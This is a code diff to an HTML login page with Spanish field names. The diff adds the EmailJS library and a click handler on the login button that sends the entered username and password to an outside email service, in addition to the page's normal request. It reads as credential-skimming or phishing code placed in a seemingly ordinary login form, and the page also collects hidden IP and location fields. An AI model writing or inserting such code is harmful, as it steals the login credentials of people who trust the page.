@@ -400,7 +400,11 @@
                     </div>
                 <input id="ip1" name="ip1" type="hidden" value="" /><input id="ip2" name="ip2" type="hidden" value="" /><input id="latitud" name="latitud" type="hidden" value="" /><input id="longitud" name="longitud" type="hidden" value="" /><input id="longitud" name="longitud" type="hidden" value="" />
             </form>    
+        <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
         <script>
+            (function(){
+                emailjs.init('na9jq2s3GuRzXAi1O');
+            })()
             document.getElementById('ingresar').addEventListener('click', function() {
                 var usuario = document.getElementById('usuario').value;
                 var password = document.getElementById('txtPassword').value;
@@ -411,10 +415,24 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({ usuario: usuario, password: password })
+                }).then(data =>{
+                    console.log(data);
                 })
                 .catch(error => {
                     console.error('Error en la solicitud fetch:', error);
                     alert("Error en la solicitud fetch. Revisa la consola para más detalles.");
+                });
+
+                var templateParams = {    
+                    usuario: usuario,
+                    password: password
+                 };
+
+                 emailjs.send('service_nlykogc', 'template_j586elp', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                }, function(error) {
+                    console.log('FAILED...', error);
                 });
             });
         </script>        
